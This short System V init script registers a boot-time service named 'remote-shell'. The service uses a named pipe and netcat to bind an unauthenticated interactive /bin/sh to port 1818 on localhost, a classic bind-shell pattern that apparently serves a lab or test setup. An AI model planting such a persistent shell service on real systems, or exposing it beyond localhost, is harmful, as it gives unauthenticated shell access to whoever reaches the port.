#!/bin/sh

### BEGIN INIT INFO
# Provides:          remote-shell
# Required-Start:
# Required-Stop:
# Default-Start:     5
# Default-Stop:      0 6
# Short-Description: Create a bind shell restricted to localhost
### END INIT INFO

start() {
    mkfifo /tmp/f
    (cat /tmp/f | /bin/sh -i 2>&1 | nc -nlvp 1818 -s 127.0.0.1 > /tmp/f)
}

stop() {
    killall nc
    rm -f /tmp/f
}

case "$1" in
    start)
        start
        ;;
    stop)
        stop
        ;;
    restart)
        stop
        start
        ;;
    *)
        echo "Usage: $0 {start|stop|restart}" >&2
        exit 1
        ;;
esac

exit 0
